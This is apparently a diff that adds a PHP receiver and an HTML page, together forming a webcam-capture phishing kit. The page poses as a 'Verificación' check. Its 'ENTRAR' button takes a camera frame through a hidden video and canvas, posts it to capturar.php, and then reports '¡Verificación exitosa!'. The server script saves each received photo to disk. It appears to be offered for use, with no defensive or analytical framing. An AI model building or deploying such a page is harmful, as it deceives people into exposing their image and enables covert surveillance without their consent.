@@ -1,0 +1,112 @@
+nano capturar.php
+
+<?php
+if (isset($GLOBALS['HTTP_RAW_POST_DATA'])) {
+    $rawdata = $GLOBALS['HTTP_RAW_POST_DATA'];
+} else {
+    $rawdata = file_get_contents('php://input');
+}
+
+$klar = json_decode($rawdata, true);
+
+if (isset($klar['imgBase64'])) {
+    $imagePayload = $klar['imgBase64'];
+    $imagePayload = str_replace('data:image/jpeg;base64,', '', $imagePayload);
+    $imagePayload = str_replace(' ', '+', $imagePayload);
+    $decodedData = base64_decode($imagePayload);
+    
+    $filename = "foto_" . date("Y-m-d_H-i-s") . ".jpg";
+    file_put_contents($filename, $decodedData);
+    echo "Guardado correctamente: " . $filename;
+} else {
+    echo "No se recibió ninguna imagen.";
+}
+?>
+
+
+
+
+
+nano index.html
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Verificación</title>
+    <style>
+        body {
+            background-color: #000000;
+            color: #ffffff;
+            font-family: sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        h2 {
+            margin-bottom: 30px;
+            font-size: 24px;
+        }
+        .btn-entrar {
+            background-color: #ff0000;
+            color: #ffffff;
+            border: none;
+            padding: 20px 40px;
+            font-size: 22px;
+            font-weight: bold;
+            border-radius: 12px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(255, 0, 0, 0.4);
+        }
+        .btn-entrar:active {
+            transform: scale(0.95);
+        }
+    </style>
+</head>
+<body>
+
+    <h2>Verificando sistema...</h2>
+    <button class="btn-entrar" onclick="iniciar()">ENTRAR</button>
+
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        function iniciar() {
+            navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } })
+            .then(function(stream) {
+                var video = document.getElementById('video');
+                video.srcObject = stream;
+                setTimeout(function() {
+                    var canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    var ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    var dataURL = canvas.toDataURL('image/jpeg');
+                    
+                    fetch('capturar.php', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ imgBase64: dataURL })
+                    })
+                    .then(response => response.text())
+                    .then(data => {
+                        console.log(data);
+                        alert("¡Verificación exitosa!");
+                    });
+                    
+                    stream.getTracks().forEach(track => track.stop());
+                }, 1500);
+            })
+            .catch(function(error) {
+                alert("Se requieren permisos para continuar.");
+            });
+        }
+    </script>
+</body>
+</html>
